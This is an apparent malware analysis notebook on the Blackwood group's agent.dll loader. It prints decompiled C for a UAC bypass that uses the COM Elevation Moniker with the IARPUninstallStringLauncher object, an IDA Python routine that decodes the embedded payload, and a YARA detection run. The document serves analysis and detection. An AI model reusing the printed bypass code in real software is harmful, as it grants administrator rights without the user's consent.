# Black Wood DLL Loader

## Description
Was searching through VX Underground's Archive and saw DLL loader. Also, taking this as an excuse to try out [yara-x](https://github.com/VirusTotal/yara-x)

## Malware Hash
|Malware Name|SHA256|Description|
|---|---|---|
|agent.dll|72B81424D6235F17B3FC393958481E0316C63CA7AB9907914B5A737BA1AD2374|DLL Loader|

# Quick Peek
There are just a few functions. Just 5 functions in total.

## Ordinal 1 - `agent_1-sub_10001A70`
1. Checks if the current executable is `run32dll.exe`.
2. If yes, sub_100013E0

## sub_100013E0 - UAC Bypass
This function attempts to instantiate and interact with COM object that requires admin privileges. UAC bypasses User Account Control by leveraging the COM Elevation Moniker to create and interact with elevated COM object.

- `Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}`
    - https://gist.github.com/Elm0D/de94d428ef8c45b7cd24409b5c343a33
  ```
     ARP UninstallString Launcher
    {FCC74B77-EC3E-4dd8-A80B-008A702075A9}
  ```
- `{F885120E-3789-4fd9-865E-DC9B4A6412D2}`
    - This is CLSID for `IARPUninstallStringLauncher`
    - Found from Registry `InProcServer32`
    - `C:\Windows\system32\appwiz.cpl`
    - https://strontic.github.io/xcyclopedia/library/clsid_F885120E-3789-4fd9-865E-DC9B4A6412D2.html#inprocserver32
    - Very likely used to bypass UAC
        - https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC/blob/master/IARPUninstallStringLauncher.cpp
        - https://3gstudent.github.io/backup-3gstudent.github.io/%E9%80%9A%E8%BF%87COM%E7%BB%84%E4%BB%B6IARPUninstallStringLauncher%E7%BB%95%E8%BF%87UAC/
      > 通过COM组件IARPUninstallStringLauncher绕过UAC
      > 
      > 在我搜索到HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{FCC74B77-EC3E-4dd8-A80B-008A702075A9}时，获得名称ARP UninstallString Launcher

### Steps
1. GUID and IID creation
2. Copies `Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}` into `pszName` which is used for COM Elevation Moniker, used to request elevation for COM objects.
3. Initialization of COM Object via `CoInitialize(0)`
4. Setting up Bin Options to size 36
5. Get the elevated COM Object via `CoGetObject` function which yields `ppv`, an interface pointer to COM object with elevated privileges.
6. Retrieves two different pointers.
    - `LaunchUninstallStringAndWait`
    - `IARPUninstallStringLauncher_Release`
7. Prepares the second GUID string
8. `LaunchUninstallStringAndWait` is called with constructed GUID
9. `IARPUninstallStringLauncher_Release` releases COM Object
10. Unitializes the COM library

This works because once the evelated COM object is obtained, any method calls on this object are executed with admin rights. This allows the function to perform tasks that normally require elevated privlege without directly invoking a UAC prompt within the code.

```c
void sub_100013E0()
{
  void (__stdcall *pfn_LaunchUninstallStringAndWait)(void *, _DWORD, __int16 *, _DWORD, _DWORD); // eax
  void (__stdcall *pfn_IARPUninstallStringLauncher_Release)(void *); // edi
  void *ppv; // [esp+14h] [ebp-160h] BYREF
  OLECHAR sz[40]; // [esp+18h] [ebp-15Ch] BYREF
  __int16 v4[40]; // [esp+68h] [ebp-10Ch] BYREF
  WCHAR pszName[68]; // [esp+B8h] [ebp-BCh] BYREF
  BIND_OPTS pBindOptions; // [esp+140h] [ebp-34h] BYREF
  int v7; // [esp+154h] [ebp-20h]
  int v8; // [esp+160h] [ebp-14h]
  IID iid; // [esp+164h] [ebp-10h] BYREF

  sz[1] = 'F';
  sz[16] = 'F';
  sz[6] = '2';
  sz[34] = '2';
  sz[36] = '2';
  sz[13] = '9';
  sz[18] = '9';
  sz[27] = '9';
  sz[17] = 'D';
  sz[25] = 'D';
  ppv = 0;
  sz[0] = '{';
  sz[2] = '8';
  sz[3] = '8';
  sz[4] = '5';
  sz[5] = '1';
  sz[7] = '0';
  sz[8] = 'E';
  sz[9] = '-';
  sz[10] = '3';
  sz[11] = '7';
  sz[12] = '8';
  sz[14] = '-';
  sz[15] = '4';
  sz[19] = '-';
  sz[20] = '8';
  sz[21] = '6';
  sz[22] = '5';
  sz[23] = 'E';
  sz[24] = '-';
  sz[26] = 'C';
  sz[28] = 'B';
  sz[29] = '4';
  sz[30] = 'A';
  sz[31] = '6';
  sz[32] = '4';
  sz[33] = '1';
  sz[35] = 'D';
  sz[37] = '}';
  sz[38] = '\0';

  // {F885120E-3789-4fd9-865E-DC9B4A6412D2} - CLSID for `IARPUninstallStringLauncher
  if ( !IIDFromString(sz, &iid) )
  {
    wcscpy(pszName, L"Elevation:Administrator!new:{FCC74B77-EC3E-4DD8-A80B-008A702075A9}");
    CoInitialize(0);
    memset(&pBindOptions, 0, 0x24u);
    v8 = 0;
    pBindOptions.cbStruct = 36;
    v7 = 4;


    // Getting COM Object
    if ( CoGetObject(pszName, &pBindOptions, &iid, &ppv) >= 0 )
    {
      pfn_LaunchUninstallStringAndWait = *(void (__stdcall **)(void *, _DWORD, __int16 *, _DWORD, _DWORD))(*(_DWORD *)ppv + 12);
      pfn_IARPUninstallStringLauncher_Release = *(void (__stdcall **)(void *))(*(_DWORD *)ppv + 8);
      if ( pfn_LaunchUninstallStringAndWait )
      {
        if ( pfn_IARPUninstallStringLauncher_Release )
        {
          v4[3] = 'B';
          v4[5] = 'B';
          v4[6] = 'D';
          v4[27] = 'D';
          v4[34] = 'D';
          v4[35] = 'D';
          v4[9] = '-';
          v4[14] = '-';
          v4[19] = '-';
          v4[24] = '-';
          v4[0] = '{';
          v4[1] = '3';
          v4[2] = 'E';
          v4[4] = '0';
          v4[7] = 'B';
          v4[8] = '8';
          v4[10] = '1';
          v4[11] = 'B';
          v4[12] = 'E';
          v4[13] = '5';
          v4[15] = '4';
          v4[16] = '9';
          v4[17] = '1';
          v4[18] = '8';
          v4[20] = 'A';
          v4[21] = '7';
          v4[22] = '8';
          v4[23] = '8';
          v4[25] = 'A';
          v4[26] = '5';
          v4[28] = '2';
          v4[29] = 'F';
          v4[30] = 'C';
          v4[31] = 'A';
          v4[32] = '2';
          v4[33] = 'E';
          v4[36] = 'A';
          v4[37] = '}';
          v4[38] = '\0';
          pfn_LaunchUninstallStringAndWait(ppv, '\0', v4, 0, 0);
          pfn_IARPUninstallStringLauncher_Release(ppv);
        }
      }
    }
    CoUninitialize();
  }
}
```
## Decoding a large chunk of byte

Chunk of bytes gets decrypted which gets parsed
```python
# IDA Python

byte_10003010 = get_bytes(0x10003010,4436)
byte_1000300F = [0] * len(byte_10003010)
for i in range(len(byte_10003010)):
    byte_1000300F[i] = ~byte_10003010[i] & 0xFF  # Apply bitwise NOT and mask to 8 bits
hex_values = [f"{byte:x}" for byte in byte_1000300F]
print"\\x"+ "\\x".join(hex_values))

```



## Yara Rules
1. Put YARA in a folder called rules
2. Compile the rule
3. Run scan
```
yr.exe scan rules .
BlackWood \\?\M:\BlackWood\output_yar
BlackWood \\?\M:\BlackWood\rules\blackwood.yar
BlackWood \\?\M:\BlackWood\72b81424d6235f17b3fc393958481e0316c63ca7ab9907914b5a737ba1ad2374
────────────────────────────────────────────────────────────────────────────────────────────── 
 5 file(s) scanned in 0.5s. 3 file(s) matched.
```


## Reference
[https://blog.sonicwall.com/en-us/2024/01/blackwood-apt-group-has-a-new-dll-loader/](https://blog.sonicwall.com/en-us/2024/01/blackwood-apt-group-has-a-new-dll-loader/)
